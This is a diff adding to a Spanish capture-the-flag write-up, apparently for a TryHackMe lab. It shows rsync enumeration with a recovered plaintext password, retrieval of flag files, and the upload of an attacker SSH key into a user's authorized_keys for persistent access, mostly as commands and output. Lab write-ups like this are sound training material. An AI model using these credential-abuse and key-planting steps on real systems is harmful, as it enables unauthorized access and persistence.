@@ -28,8 +28,6 @@ PORT      STATE    SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 12.04 seconds
 
-Es una máquina Windows con bastantes servicios.
-
 Hago un escaneo con -sVC para ver versiones y realizar una enumeración básica. 
 
 sudo nmap -sVC -p 22,111,139,445,873,2049,6379,35771,41723,46225,54861,59803 10.128.157.233
@@ -336,3 +334,49 @@ Tengo la segunda flag y cadenas de base64. Paso la cadena por cibercheff.
 Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
 
 He conseguido credenciales para loguearme por rsync
+
+Enumero los modulos de rsync.
+rsync rsync://rsync-connect@10.128.155.41/
+files          	Necessary home interaction
+
+Y ahora enumero todo lo que hay dentro de files. (la salida es gigante)
+rsync -r --list-only --password-file=rsync.pass rsync://rsync-connect@10.128.155.41/files/
+
+Estos son los hallazgos más relevantes.
+sys-internal/user.txt
+ubuntu/.ssh/id_rsa
+sys-internal/.bash_history
+
+rsync --password-file=rsync.pass rsync://rsync-connect@10.128.155.41/files/sys-internal/user.txt ./ && cat user.txt
+THM{da7c20******************07ab} //Esta es la tercera flag
+
+Buscando maneras de tener acceso me doy cuenta de que puedo subir archivos, asique creo una clave ssh.
+ssh-keygen -t rsa -b 4096 -f id.rsa -N ""
+Generating public/private rsa key pair.
+Your identification has been saved in id.rsa
+Your public key has been saved in id.rsa.pub
+The key fingerprint is:
+SHA256:alQdrGQTCX2aeaC7aiUA+spBTx79lPUs3mGka2ELLpM mksk@********************
+The key's randomart image is:
++---[RSA 4096]----+
+|      .o.+.      |
+|.       Booo     |
+|..  .  ++O*      |
+|...o ..===.=     |
+|..+.. *.S.B .    |
+| ..o.Eo+ = .     |
+|...  o=..        |
+|..  ...          |
+|   ...           |
++----[SHA256]-----+
+
+Creo un archivo authorized_keys, meto mi clave publica y lo subo a la carpeta sys-internal/.ssh.
+cat /home/mksk/.ssh/id.rsa.pub > authorized_keys
+ rsync -av --password-file=rsync.pass /home/mksk/.ssh/authorized_keys rsync://rsync-connect@10.128.155.41/files/sys-internal/.ssh/
+sending incremental file list
+authorized_keys/
+authorized_keys/id.rsa
+
+sent 3.536 bytes  received 39 bytes  7.150,00 bytes/sec
+total size is 3.389  speedup is 0,95
+
